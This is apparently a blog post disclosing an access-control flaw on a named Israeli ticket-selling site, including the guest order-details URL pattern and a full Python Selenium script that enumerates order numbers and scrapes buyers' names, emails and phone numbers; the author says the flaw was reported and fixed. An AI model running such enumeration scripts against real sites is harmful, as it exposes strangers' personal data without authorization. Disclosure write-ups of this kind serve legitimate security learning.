---
layout: post
title: Unauthorized Access on Shoppi site.
excerpt: "It's been a long time since I last wrote, during this time I'm really studying in depth to finish the OSCP certification, in between I'm doing things that are more related to research in the Israeli internet space. I found a website that sells tickets and due to a mistake by the developer, there was an access as a guest to all the details of the buyers, I will show you here what I found and what the problem actually is, by the way, I have already contacted the company itself and the developer sorted out the issue."
tags:
- Hacking

---
It's been a long time since I last wrote, during this time I'm really studying in depth to finish the OSCP certification, in between I'm doing things that are more related to research in the Israeli internet space. I found a website that sells tickets and due to a mistake by the developer, there was an access as a guest to all the details of the buyers, I will show you here what I found and what the problem actually is, by the way, I have already contacted the company itself and the developer sorted out the issue.

# How did I get to this site.
It was about five or four months ago, my wife asked me to buy tickets for some show in the center of the country, we were looking for how to make the purchase online and found this website: `https://shoppi.co.il/`
On this site you can see that tickets are being sold for local authorities and even cities. We made a purchase that was as secure as any self-respecting website and we thought that was the end of the story.

In fact, after several days, my wife explains to me that we need the number of tickets, after I searched in my email and did not find the details about the number of tickets even though I had a purchase confirmation. Therefore, I started trying through the website to check how I can get the tickets numbers.

From there I started playing with the website and here I found a location where I can enter a number and if the number exists in the system it will retrieve the ticket details and the buyer's details. At first I thought it wasn't serious, but the deeper I went, the more I found that I was actually seeing details of different people who made a purchase for the same show.

So one evening I said to myself, let's write a code and let it run at night and in the morning we will check if the number of the card is found.
It took me a while to write the code, but in the end it worked. I left the code running at night,

In the morning when I got up and ran a search on my Linux on the results of what my code performed I found the ticket and it's information, but I also realized that what I found was in fact unauthorized access to sensitive information about various buyers of the site. It is possible that if I had dug more I might have come to the disclosure of credit information, who knows.

# How the unauthorized access was done.

As soon as I entered the site and made an enumeration I found the following link:
`https://shoppi.co.il/profile/guest/order-details/<order_number>`
As you can see, the access to this landing page is registered on a guest profile, that is, while the code was exposed, any guest could access this link, in the URL, a card number can be generated, the number itself is obviously different and it is not a number based on hundreds but thousands and even beyond. That is, all that remains is to draw numbers that will repeat themselves during the search.

The code I wrote is based on Python and uses a module called `selenium`, using this module which contains a class called `webdriver` actually makes it possible to render data from a landing page and display it in the way that is most correct for us for the code.

{% highlight python %}

#!/usr/bin/env python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import concurrent.futures

# Function to process each URL
def process_url(order_number):
    url = f"https://shoppi.co.il/profile/guest/order-details/{order_number}"
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")  # Run in headless mode
    driver = webdriver.Chrome(options=options)
    
    try:
        driver.get(url)
        wait = WebDriverWait(driver, 10)
        
        # Search for the specific words
        keywords = ["@gmail.com", "שם", "אמייל", "טלפון",c "מועד", "מצב"]
        found_elements = []
        for keyword in keywords:
            dynamic_element = wait.until(EC.presence_of_element_located((By.XPATH, f"//*[contains(text(), '{keyword}')]")))
            found_elements.append(dynamic_element.text)
        
        result = f"Order {order_number}: {' | '.join(found_elements)}"
        
        # Print to screen
        print(result)
        
        # Write to file
        with open("results.txt", "a") as file:
            file.write(f"Order {order_number}: {','.join(found_elements)}\n")
    except:
        result = f"Order {order_number}: Some keywords not found"
        print(result)
    
    driver.quit()

# Define the range of URLs you want to visit
start_order = 996000
end_order = 997000

# Process URLs in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(process_url, range(start_order, end_order + 1))


  {% endhighlight %}

As you can see, since it is an Israeli site, the caption is in Hebrew, therefore this caption is used in order to capture the required information and divide it in such a way that the code can display this information properly.

After running the code, we will receive the interesting detail that will contain the buyers' names, phone numbers, as well as the card number field, and also data such as address and number of purchases.

<iframe width="560" height="315" src="https://www.youtube.com/embed/L6JIAX0pmM4" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>

# What was done after that vuln was found.

I have made content to the site's support, and they told me that they pass that info to the development team in the end, I passed them the code and the POC that proves the very existence of unauthorized access, after a few days they solved the problem and it is no longer possible to access the same landing pages as a guest.

Only after registration can you see the personal tickets and more details. Authorization was not performed and only a purchase was performed, the data will still be folded in the email.

If details are missing, contact the site's technical team and they will be able to provide the applicants with the details they are looking for, I am very excited about this.

I actually found a type of weakness that is based on application that is lake of secure development and ignores several important layers at the development level.

I hope that from here I will be able to raise my head and find more serious weaknesses. It is clear to me that it requires time and experience, but as long as there is a pulse in the heart and desire, it can be done.

Let's remember, if Trump is president, then any commoner can be even me.

greetings

Guy Zberdling







